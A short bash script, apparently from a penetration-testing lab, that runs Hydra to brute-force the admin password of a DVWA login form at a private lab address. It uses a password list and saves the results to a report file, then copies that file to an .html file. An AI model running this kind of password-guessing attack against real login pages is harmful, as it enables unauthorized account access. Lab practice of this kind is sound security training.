#!/bin/bash
hydra -l admin -P senhas.txt 172.20.0.2 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed" -o relatorio.txt
cat relatorio.txt > relatorio.html
